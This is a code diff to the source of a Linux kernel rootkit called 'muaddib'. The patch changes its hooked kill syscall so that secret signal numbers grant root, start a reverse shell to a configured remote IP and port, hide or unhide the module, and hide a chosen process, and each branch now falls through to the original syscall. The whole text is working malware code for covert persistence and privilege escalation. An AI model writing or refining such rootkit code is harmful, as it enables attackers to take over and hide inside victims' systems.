@@ -38,37 +38,35 @@ asmlinkage int muaddib_kill(const struct pt_regs *regs)
         printk(KERN_INFO "muaddib: giving root");
         #endif
         set_root();
-        return 0;
+        return og_kill(regs);
     }
-
     else if(sig == 42){
         #if DEBUGMSG == 1
         printk(KERN_INFO "muaddib: starting reverse shell from kill");
         #endif
         start_reverse_shell(REVERSE_SHELL_IP, REVERSE_SHELL_PORT);
-        return 0;
+        return og_kill(regs);
     }
-
     else if(sig == 63){
         #if DEBUGMSG == 1
         printk(KERN_INFO "muaddib: hiding");
         #endif
         hideme();
-        return 0;
+        return og_kill(regs);
     }
     else if(sig == 62){
         #if DEBUGMSG == 1
         printk(KERN_INFO "muaddib: showing");
         #endif
         showme();
-        return 0;
+        return og_kill(regs);
     }
     else if(sig == 44){
         #if DEBUGMSG == 1
         printk(KERN_INFO "muaddib: hiding %d", pid);
         #endif
         sprintf(hide_pid, "%d", pid);
-        return 0;
+        return og_kill(regs);
     }
     return og_kill(regs);
 
@@ -86,7 +84,7 @@ static asmlinkage int muaddib_kill(pid_t pid, int sig)
         printk(KERN_INFO "muaddib: giving root");
         #endif
         set_root();
-        return 0;
+        return og_kill(pid, sig);
     }
 
     else if(sig == 42){
@@ -94,7 +92,7 @@ static asmlinkage int muaddib_kill(pid_t pid, int sig)
         printk(KERN_INFO "muaddib: starting reverse shell from kill");
         #endif
         start_reverse_shell(REVERSE_SHELL_IP, REVERSE_SHELL_PORT);
-        return 0;
+        return og_kill(pid, sig);
     }
 
     else if(sig == 63){
@@ -102,21 +100,21 @@ static asmlinkage int muaddib_kill(pid_t pid, int sig)
         printk(KERN_INFO "muaddib: hiding");
         #endif
         hideme();
-        return 0;
+        return og_kill(pid, sig);
     }
     else if(sig == 62){
         #if DEBUGMSG == 1
         printk(KERN_INFO "muaddib: showing");
         #endif
         showme();
-        return 0;
+        return og_kill(pid, sig);
     }
     else if(sig == 44){
         #if DEBUGMSG == 1
         printk(KERN_INFO "muaddib: hiding %d", pid);
         #endif
         sprintf(hide_pid, "%d", pid);
-        return 0;
+        return og_kill(pid, sig);
     }
 
 
